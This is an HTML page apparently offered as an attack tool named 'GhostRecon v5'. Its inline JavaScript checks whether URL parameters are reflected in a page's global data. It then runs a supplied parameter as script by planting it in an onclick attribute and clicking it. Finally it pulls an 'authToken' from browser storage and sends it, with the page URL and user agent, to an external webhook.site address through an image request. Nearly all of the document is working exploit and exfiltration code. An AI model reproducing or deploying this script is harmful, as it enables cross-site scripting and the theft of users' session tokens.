<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GhostRecon v5 – DOM Auto Exploit Trigger + Token Extract</title>
</head>
<body>
  <h2>🧪 GhostRecon v5 – DOM Auto Exploit Trigger + Token Leak</h2>
  <script>
    (function () {
      const searchParams = new URLSearchParams(location.search);
      const tl = searchParams.get("tl") || "";
      const sl = searchParams.get("sl") || "";
      const op = searchParams.get("op") || "";

      const reflected = [];
      const WIZ = window.WIZ_global_data || {};

      // فحص الانعكاسات
      for (const [key, value] of Object.entries(WIZ)) {
        [tl, sl, op].forEach((param) => {
          if (typeof value === "string" && value.includes(param)) {
            reflected.push({ param, foundIn: key });
          }
        });
      }

      // محاولة تنفيذ
      let executed = false;
      try {
        const decoded = decodeURIComponent(tl);
        if (/alert|confirm|prompt/.test(decoded)) {
          const el = document.createElement("div");
          el.setAttribute("onclick", decoded);
          document.body.appendChild(el);
          el.click();
          executed = true;
        }
      } catch (e) {
        executed = false;
      }

      // 🧠 استخراج التوكن بعد التنفيذ
      const token = localStorage.getItem("authToken") || sessionStorage.getItem("authToken") || "N/A";

      // إرسال النتائج مع التوكن
      const result = {
        timestamp: new Date().toISOString(),
        page: location.href,
        executed,
        token,
        reflectedParams: reflected,
        userAgent: navigator.userAgent
      };

      const img = new Image();
      img.src = "https://webhook.site/837af5cd-4719-4b27-81e8-01828dbf96ec?leak=" + encodeURIComponent(JSON.stringify(result));
    })();
  </script>
</body>
</html>
